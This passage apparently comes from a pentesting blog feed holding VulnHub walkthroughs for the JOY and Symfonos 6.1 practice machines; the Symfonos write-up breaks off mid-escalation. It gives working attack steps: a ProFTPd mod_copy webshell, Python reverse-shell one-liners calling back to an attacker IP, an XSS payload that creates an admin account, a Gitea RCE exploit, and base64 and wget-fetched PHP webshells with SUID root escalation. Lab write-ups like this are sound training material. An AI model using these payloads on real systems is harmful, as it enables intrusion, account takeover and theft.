┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/tftp] └─# cat * &amp;gt;&amp;gt; compiled.txt cat: script: Is a directory ProFTPd 1.3.5 /var/www/tryingharderisjoy We are able to insert a webshell into /var/www/tryingharderisjoy TCP/21 (FTP) - ProFTPD 1.3.5 Exploit Search exploits for ProFTPd 1.3.5 Exploit Title Path ProFTPd 1.3.5 - ‘mod_copy’ Remote Command Execution (2) linux/remote/49908.py Manual exploit ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/exploit]└─# nc $ip 21220 The Good Tech Inc. FTP Serversite cpfr /proc/self/cmdline350 File or directory exists, ready for destination namesite cpto &amp;lt;?php system($_GET[&quot;c&quot;]);?&amp;gt;250 Copy successfulsite cpfr &amp;lt;?php system($_GET[&quot;c&quot;]);?&amp;gt;350 File or directory exists, ready for destination namesite cpto /var/www/tryingharderisjoy/web_shell.php250 Copy successfulQUIT221 Goodbye. Created a webshell TCP/80 (HTTP) - Webshell Execute commands ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/exploit] └─# curl http://192.168.110.26/web_shell.php?c=id proftpd: 192.168.110.4:47940: SITE cpto uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec) Obtain a www-data shell # Enter this in your web browser 192.168.110.26/web_shell.php?c=python+-c+&#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;192.168.110.4&quot;,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39; Privilege EscalationPatrick - Via Creds Found Found credentials at /ossec/patricksecretsofjoy patrick@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy credentials for JOY: patrick:apollo098765 root:howtheheckdoiknowwhattherootpasswordis how would these hack3rs ever find such a page? Switch to patrick w/ patrick:apollo098765 Root - Via Sudo Check for sudo access patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l Matching Defaults entries for patrick on JOY: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User patrick may run the following commands on JOY: (ALL) NOPASSWD: /home/patrick/script/test patrick@JOY:/var/www/tryingharderisjoy/ossec$ The script allows user to specify a file/directory to change permission, we can exploit it by changing the permission of the entire /home/patrick/script/ directory into world writable, readable and executable. Exploit by changing permission of /home/patrick/script/ patrick@JOY:~$ sudo /home/patrick/script/test I am practising how to do simple bash scripting! What file would you like to change permissions within this directory? ../script What permissions would you like to set the file to? 777 Currently changing file permissions, please wait. Tidying up... Done! patrick@JOY:~$ cd script Replace test w/ bash script to create a root shell patrick@JOY:~/script$ rm test patrick@JOY:~/script$ printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; test; chmod 4777 test; Obtain root shell patrick@JOY:~/script$ /tmp/rootbash -p Root Flag rootbash-4.4# cat proof.txt Never grant sudo permissions on scripts that perform system functions! rootbash-4.4# Thanks for joining us! If you have not rooted MERCY, DEVELOPMENT, BRAVERY, TORMENT, please root them too! This will conclude the series of five boxes on Vulnhub for pentesting practice, and once again, these were built while thinking about OffSec in mind. :-) For those who have helped made videos on rooting these boxes, I am more than grateful for your support. This means a lot for the box creator and those who have helped test these boxes. A shoutout to the kind folk from Wizard Labs, Zajt, as well as friends in the local security community which I belong to. If you found the boxes a good learning experience, feel free to share them with your friends. As of the time of writing, I will be working on (building) some boxes on Wizard-Labs, in a similar flavour to these boxes. If you enjoyed these, consider pinging them and their project. I think their lab is slowly being built into a nice lab with a variety of machines with good learning value. I was rather glad someone found me on Linkedin after breaking into these boxes. If you would like to contact the author, you can find some of the author&#39;s contact points on his website (https://donavan.sg). May the r00t be with you. P.S. Someone asked me, also, about &quot;shesmileslikeabrightsmiley&quot;. Yes, indeed, she smiles like a bright smiley. She makes me smile like a bright smiley too? :-) rootbash-4.4# " }, { "title": "Vulnhub - Symfonos 6.1", "url": "/posts/Symfonos-6.1/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/web-app-cms-exploit, linux-priv-esc/sudo/unknown-exec", "date": "2022-02-10 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web application (flyspray 1.0) that is susceptible to XSS + CSRF on its post comments which will create an admin account for the attacker when admin visits the post causing the malicious script to reflect onto the admin’s browser.The admin account that is created reveals credentials for the gitea web applicatio hosted on TCP/3000. Also, gitea (1.1.0 to 1.12.5) is susceptible to authenticated remote code execution, allowing us to obtain a shellFor the privilege escalation part, we have to escalate our privileges twice, to achilles and to root. Achilles user is obtain via reused credentials and root is obtained via sudo misconfiguration whereby achilles is allowed to run GO as a superuser, allowing us to run a go reverse shell to obtain root.WalkthroughReconNMAP Complete Scan# Nmap 7.92 scan initiated Thu Feb 10 21:59:50 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-6.1/192.168.110.24/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Symfonos-6.1/192.168.110.24/scans/xml/_full_tcp_nmap.xml 192.168.110.24Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex &#39;^HTTP/1\\.0 404 Not Found\\r\\n(?:[^&amp;lt;]+|&amp;lt;(?!/head&amp;gt;))*?&amp;lt;style&amp;gt;\\nbody \\{ background-color: #fcfcfc; color: #333333; margin: 0; padding:0; \\}\\nh1 \\{ font-size: 1\\.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; \\}\\nh1, p \\{ padding-left: 10px; \\}\\ncode\\.url \\{ background-color: #eeeeee; font-family:monospace; padding:0 2px;\\}\\n&amp;lt;/style&amp;gt;&#39;Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex &#39;^HTTP/1\\.0 404 Not Found\\r\\n(?:[^&amp;lt;]+|&amp;lt;(?!/head&amp;gt;))*?&amp;lt;style&amp;gt;\\nbody \\{ background-color: #ffffff; color: #000000; \\}\\nh1 \\{ font-family: sans-serif; font-size: 150%; background-color: #9999cc; font-weight: bold; color: #000000; margin-top: 0;\\}\\n&amp;lt;/style&amp;gt;&#39;adjust_timeouts2: packet supposedly had rtt of -459256 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -459256 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -460360 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -460360 microseconds. Ignoring time.Nmap scan report for 192.168.110.24Host is up, received arp-response (0.00071s latency).Scanned at 2022-02-10 21:59:51 +08 for 267sNot shown: 65530 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 0e:ad:33:fc:1a:1e:85:54:64:13:39:14:68:09:c1:70 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDf/gc994jzNxH6zt01DmK3gjycek/l6sVS6dfftHPUGVQt/lyQ4WxKgw77iwAHLBHkcXnd3+F3Z0vt9bAxWosreMK9dh9JMCqNitKGbs3v+GbsBUuJClmERzTqbaL/9PqGOGfbbg3JPgVBAhJpF9SUs2pV2mSrxTgNM5faDf7S5qGzdIn6m8ivP70MtGKdF3ogns26ZIU5kvkqUdqUJb/V7HaJjnpDkgQC56Fcy9+FkLHDqsFuBOg4WLuQI+1N7jWHzFedWQ5knzVs78dtlPPGdnrqERThIov8Ki3Fz10X4KOsRccAqbosMWAmhJqTbQPle9qag222SqC9EXCikU6d| 256 54:03:9b:48:55:de:b3:2b:0a:78:90:4a:b3:1f:fa:cd (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFGrBeScWRqBYfW+MJFyVReI/bSSuEsJBllEMyV1lCt9FWPMMFl8konSIH5WWc0r/9LolA9yFDFLDs2xpF9+hhA=| 256 4e:0c:e6:3d:5c:08:09:f4:11:48:85:a2:e7:fb:8f:b7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO14/cung3UzL0a3rbctlN+MUZnXon2oaNflvb7ISJQW80/tcp open http syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).| http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.403000/tcp open ppp? syn-ack ttl 64| fingerprint-strings: | GenericLines, Help: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=1a02f70307a7eadb; Path=/; HttpOnly| Set-Cookie: _csrf=R9-J7iqrqkstRS8rupP2JoxIsso6MTY0NDUzMDQwMjg3OTgyNDg2MA; Path=/; Expires=Fri, 11 Feb 2022 22:00:02 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Thu, 10 Feb 2022 22:00:02 GMT| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en-US&quot;&amp;gt;| &amp;lt;head data-suburl=&quot;&quot;&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt; Symfonos6&amp;lt;/title&amp;gt;| &amp;lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&amp;gt;| &amp;lt;script&amp;gt;| (&#39;serviceWorker&#39; in navigator) {| navigator.serviceWorker.register(&#39;/serviceworker.js&#39;).then(function(registration) {| console.info(&#39;ServiceWorker registration successful with scope: &#39;, registrat| HTTPOptions: | HTTP/1.0 404 Not Found| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=65f01c822d2e3550; Path=/; HttpOnly| Set-Cookie: _csrf=73HOm-6Ii9FgFA2-DHDNERrTlVo6MTY0NDUzMDQwNzkwODUyNjA3OA; Path=/; Expires=Fri, 11 Feb 2022 22:00:07 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Thu, 10 Feb 2022 22:00:07 GMT| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en-US&quot;&amp;gt;| &amp;lt;head data-suburl=&quot;&quot;&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt;Page Not Found - Symfonos6&amp;lt;/title&amp;gt;| &amp;lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&amp;gt;| &amp;lt;script&amp;gt;| (&#39;serviceWorker&#39; in navigator) {| navigator.serviceWorker.register(&#39;/serviceworker.js&#39;).then(function(registration) {|_ console.info(&#39;ServiceWorker registration successful3306/tcp open mysql syn-ack ttl 64 MariaDB (unauthorized)5000/tcp open upnp? syn-ack ttl 64| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 Not Found| Content-Type: text/plain| Date: Thu, 10 Feb 2022 22:00:32 GMT| Content-Length: 18| page not found| GenericLines, Hello, Help, Kerberos, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 404 Not Found| Content-Type: text/plain| Date: Thu, 10 Feb 2022 22:00:02 GMT| Content-Length: 18| page not found| HTTPOptions: | HTTP/1.0 404 Not Found| Content-Type: text/plain| Date: Thu, 10 Feb 2022 22:00:17 GMT| Content-Length: 18|_ page not found2 services unrecognized despite returning data. If you know the service/version, please submit the TRACEROUTEHOP RTT ADDRESS1 0.70 ms 192.168.110.24Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Feb 10 22:04:18 2022 -- 1 IP address (1 host up) scanned in 268.53 secondsTCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Symfonos-6.1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.24/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.html [Status: 403, Size: 207, Words: 15, Lines: 9].hta.php [Status: 403, Size: 210, Words: 15, Lines: 9].htaccess.html [Status: 403, Size: 216, Words: 15, Lines: 9] [Status: 200, Size: 251, Words: 26, Lines: 22].htaccess.txt [Status: 403, Size: 215, Words: 15, Lines: 9].htpasswd [Status: 403, Size: 211, Words: 15, Lines: 9].htpasswd.html [Status: 403, Size: 216, Words: 15, Lines: 9].htaccess [Status: 403, Size: 211, Words: 15, Lines: 9].htpasswd.txt [Status: 403, Size: 215, Words: 15, Lines: 9].htaccess.php [Status: 403, Size: 215, Words: 15, Lines: 9].hta.html [Status: 403, Size: 211, Words: 15, Lines: 9].hta [Status: 403, Size: 206, Words: 15, Lines: 9].hta.txt [Status: 403, Size: 210, Words: 15, Lines: 9]cgi-bin/ [Status: 403, Size: 210, Words: 15, Lines: 9]cgi-bin/.html [Status: 403, Size: 215, Words: 15, Lines: 9].htpasswd.php [Status: 403, Size: 215, Words: 15, Lines: 9]flyspray [Status: 301, Size: 239, Words: 14, Lines: 8]index.html [Status: 200, Size: 251, Words: 26, Lines: 22]index.html [Status: 200, Size: 251, Words: 26, Lines: 22]posts [Status: 301, Size: 236, Words: 14, Lines: 8]:: Progress: [18460/18460] :: Job [1/1] :: 30 req/sec :: Duration: [0:00:12] :: Errors: 0 :: cgi-bin/ flyspray postsTCP/3000FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit]└─# ffuf -u http://192.168.110.24:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.php,.html,.txt&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.24:3000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .php .html .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________ [Status: 200, Size: 10163, Words: 717, Lines: 307]admin [Status: 302, Size: 34, Words: 2, Lines: 3]avatars [Status: 302, Size: 31, Words: 2, Lines: 3]css [Status: 302, Size: 27, Words: 2, Lines: 3]debug [Status: 200, Size: 160, Words: 18, Lines: 5]explore [Status: 302, Size: 37, Words: 2, Lines: 3]img [Status: 302, Size: 27, Words: 2, Lines: 3]issues [Status: 302, Size: 34, Words: 2, Lines: 3]js [Status: 302, Size: 26, Words: 2, Lines: 3]notifications [Status: 302, Size: 34, Words: 2, Lines: 3]vendor [Status: 302, Size: 30, Words: 2, Lines: 3]:: Progress: [18460/18460] :: Job [1/1] :: 366 req/sec :: Duration: [0:00:48] :: Errors: 0 :: adminTCP/5000FFUF No directories enumeratedInitial FootholdTCP/5000 - 404 page Proceed to http://192.168.110:5000 TCP/3000 (HTTP) - Gitea View enumerated directories admin Gitea Version 1.11.4 Others Redirected to login panel Error page Proceed to Explore -&amp;gt; Users, found some usernames Usernames: achilles zayotic Search exploits for Gitea Version 1.11.4 Exploit Title Path Gitea 1.12.5 - Remote Code Execution (Authenticated) multiple/webapps/49571.py We have to obtain some credentials before we can use this exploit Vulnhub: DevGuru 1 also exploits Gitea Authenticated RCE TCP/80 (HTTP) - Flyspray 1.0 XSS/CSRF View enumerated directories cgi-bin/ Could not enumerate any .cgi files flyspray flyspray posts Create a wordlist from /posts ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit] └─# cewl $ip/posts -w cewl_post.txt CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Register user testing &amp;amp; login After browsing browsing through /flyspray, found its version flyspray 1.0 Search exploits for flyspray 1.0 Exploit Title Path FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery php/webapps/41918.txt Try php/webapps/41918.txt Register an account Add a comment under symfonos bug Login &amp;amp; edit Real Name: &quot;&amp;gt;&amp;lt;script src=&quot;http://192.168.110.4/script.js&quot;&amp;gt;&amp;lt;/script&amp;gt; Create script.js that will create an admin account, hacker:12345678 var tok = document.getElementsByName(&#39;csrftoken&#39;)[0].value; var txt = &#39;&amp;lt;form method=&quot;POST&quot; id=&quot;hacked_form&quot; action=&quot;index.php?do=admin&amp;amp;area=newuser&quot;&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;admin.newuser&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;do&quot; value=&quot;admin&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;area&quot; value=&quot;newuser&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;user_name&quot; value=&quot;hacker&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;&#39; + tok + &#39;&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;user_pass&quot; value=&quot;12345678&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;user_pass2&quot; value=&quot;12345678&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;real_name&quot; value=&quot;root&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;email_address&quot; value=&quot;root@root.com&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;verify_email_address&quot; value=&quot;root@root.com&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;jabber_id&quot; value=&quot;&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;notify_type&quot; value=&quot;0&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;time_zone&quot; value=&quot;0&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;input type=&quot;hidden&quot; name=&quot;group_in&quot; value=&quot;1&quot;/&amp;gt;&#39; txt += &#39;&amp;lt;/form&amp;gt;&#39; var d1 = document.getElementById(&#39;menu&#39;); d1.insertAdjacentHTML(&#39;afterend&#39;, txt); document.getElementById(&quot;hacked_form&quot;).submit(); Start a python HTTP server hosting script.js ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Wait for administrator to visit the post, script.js is queried ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 192.168.110.24 - - [11/Feb/2022 01:10:00] &quot;GET /script.js HTTP/1.1&quot; 304 - POC Video Login w/ hacker:12345678 achilles:h2sBr9gryBunKdF9 TCP/3000 (HTTP) - Gitea RCE (Authenticated) Start a listener Use the exploit we found earlier multiple/webapps/49571.py ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit]└─# python3 49571.py -t http://$ip:3000 -u achilles -p h2sBr9gryBunKdF9 -I 192.168.110.4 -P 1337 _____ _ _______ / ____(_)__ __| CVE-2020-14144 | | __ _ | | ___ __ _ | | |_ | | | |/ _ \\/ _` | Authenticated Remote Code Execution | |__| | | | | __/ (_| | \\_____|_| |_|\\___|\\__,_| GiTea versions &amp;gt;= 1.1.0 to &amp;lt;= 1.12.5[+] Starting exploit ...hint: Using &#39;master&#39; as the name for the initial branch. This default branch namehint: is subject to change. To configure the initial branch name to use in allhint: of your new repositories, which will suppress this warning, call:hint: hint: git config --global init.defaultBranch &amp;lt;name&amp;gt;hint: hint: Names commonly chosen instead of &#39;master&#39; are &#39;main&#39;, &#39;trunk&#39; andhint: &#39;development&#39;. The just-created branch can be renamed via this command:hint: hint: git branch -m &amp;lt;name&amp;gt;Initialized empty Git repository in /tmp/tmp.hAJ2fkCy4d/.git/[master (root-commit) cae0214] Initial commit 1 file changed, 1 insertion(+) create mode 100644 README.mdEnumerating objects: 3, done.Counting objects: 100% (3/3), done.Writing objects: 100% (3/3), 241 bytes | 241.00 KiB/s, done.[+] Exploit completed ! Manual exploitTCP/22 (SSH) Obtain a more stable shell by copying your private key into git’s .ssh/authorized_keys [git@symfonos6 tmp]$ cd /home/achilles [git@symfonos6 ~]$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeiQIVUawX98au7XzxT8GIdr2FNcZxtxpyDU/+TuwyCyoyWeM6iRyy2f+1xRqeca7dsaPIsPtp7nKwcpDzMCH9uXMKZFXBU4GedcDgL5rFMWONq6GdivuY+oflxlukJrnFn8Y/roNqjtwntXKnV+1dkCXjI8zLly7V1nt7W3U+kLzUgem3uso18RCoCTJLf+XlrF0PGuiuIGP3zZVuadrYm5VdDwbgOSUcUL3Zu+FU1W1wC2QE0EhhgBWXrwBQuIZiq4rFRo9RuxoFl42YyFgGugmV405/ROAXypR+M7vT5JnUt/7Zs4Y2lmapKY8rS93EPZIfurBCzB2YUNyNBbrZHyxAj/5I9iLqdRPvyI22NoRTz7U9s= root@kali&quot; &amp;gt; .ssh/authorized_keys SSH w/ your id_rsa ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit] └─# ssh git@$ip -i /root/.ssh/id_rsa Last login: Thu Feb 10 20:39:02 2022 from 192.168.110.4 [git@symfonos6 ~]$ Head to Privilege EscalationInitial Foothold (2) - Exploit API Instead of exploiting Gitea itself w/ 49571.py, exploit the api at TCP/5000 Login Gitea w/ achilles:h2sBr9gryBunKdF9 Proceed to Repositories -&amp;gt; symfonos-api, it contains the source code for the API running at TCP/5000 I am not familiar with golang, so I am not 100% sure what the code is doing. After viewing the code, we are able to insert do RCE api.go access the api at http://$ip:5000/ls2o4g posts.go Before we can POST a webshell, we must be authenticated first We can POST a webshell at /ls2o4g/api/v1.0/posts auth.go We are able to authenticate at /ls2o4g/api/v1.0/auth/login index.php htmlspecialchars, characters are escaped Obtain a shell by bypassing htmlspecialchars &amp;amp; inserting a web shell, refered to a writeup to create the json request. Authenticate ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1] └─# curl -H &quot;Content-Type: application/json&quot; &quot;http://$ip:5000/ls2o4g/v1.0/auth/login&quot; -d &#39;{&quot;username&quot;:&quot;achilles&quot;,&quot;password&quot;:&quot;h2sBr9gryBunKdF9&quot;}&#39; {&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDUxNTQwOTUsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.Jd-JaDANHB02bKU80EaSvdlXG-ggfDRxR4ly36IG8FM&quot;,&quot;user&quot;:{&quot;display_name&quot;:&quot;achilles&quot;,&quot;id&quot;:1,&quot;username&quot;:&quot;achilles&quot;}} Base64 encode webshell to bypass htmlspecialchars echo &#39;&amp;lt;?php system($_GET[&quot;cmd&quot;]); ?&amp;gt;&#39; | base64 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg== Insert a webshell to post curl -H &quot;Content-Type: application/json&quot; -X PATCH &quot;http://$ip:5000/ls2o4g/v1.0/posts/1&quot; -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDUxNTYwOTIsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.K2htM7cr61qekEVl4ueWKvblmQAmTbMMg7LaQgPvIb4&quot; -d $&#39;{&quot;text&quot;:&quot;file_put_contents(\\&#39;shell.php\\&#39;, base64_decode(\\&#39;PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\\&#39;));&quot;}&#39; {&quot;created_at&quot;:&quot;2020-04-02T04:41:22-04:00&quot;,&quot;id&quot;:1,&quot;text&quot;:&quot;file_put_contents(&#39;shell.php&#39;, base64_decode(&#39;PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&#39;));&quot;,&quot;user&quot;:{&quot;display_name&quot;:&quot;achilles&quot;,&quot;id&quot;:1,&quot;username&quot;:&quot;achilles&quot;}} Webshell is inserted to the body of /post, however, the code is not executed yet. Execute our payload by visting /post ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1] └─# curl http://192.168.110.25/posts/ Obtain a shell # Enter this in your browser http://192.168.110.31/posts/shell.php?cmd=python%20-c%20%27socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.110.4&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)%27 Alternative, bypassing htmlspecialchars by downloading a webshell directly onto the webserver Insert php code to download php-reverse-shell.php into the body of /post ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit/api] └─# curl -H &quot;Content-Type: application/json&quot; -X PATCH &quot;http://$ip:5000/ls2o4g/v1.0/posts/1&quot; -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDUxNTYwOTIsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.K2htM7cr61qekEVl4ueWKvblmQAmTbMMg7LaQgPvIb4&quot; -d $&#39;{&quot;text&quot;:&quot;system(\\&#39;wget 192.168.110.4/php-reverse-shell.php\\&#39;)&quot;}&#39; --header &quot;Content-Type: application/json&quot; {&quot;created_at&quot;:&quot;2022-02-10T23:15:45.778410883-05:00&quot;,&quot;id&quot;:6,&quot;text&quot;:&quot;system(&#39;wget 192.168.110.4/php-reverse-shell.php&#39;)&quot;,&quot;user&quot;:{&quot;display_name&quot;:&quot;achilles&quot;,&quot;id&quot;:1,&quot;username&quot;:&quot;achilles&quot;}} Start a python http server hosting php-reverse-shell.php ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit/api] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Execute the php code to download php-reverse-shell.php ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1] └─# curl http://192.168.110.25/posts/ ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit/api] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 192.168.110.25 - - [11/Feb/2022 04:17:21] &quot;GET /php-reverse-shell.php HTTP/1.1&quot; 200 - Execute php-reverse-shell.php ┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit/api] └─# curl http://$ip/posts/php-reverse-shell.php Privilege EscalationAchilles - Via Creds Found Switch to Achilles w/ achilles:h2sBr9gryBunKdF9 Root - Via Sudo Check for sudo access [achilles@symfonos6 git]$ sudo -l Matching Defaults entries for achilles on symfonos6: !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, 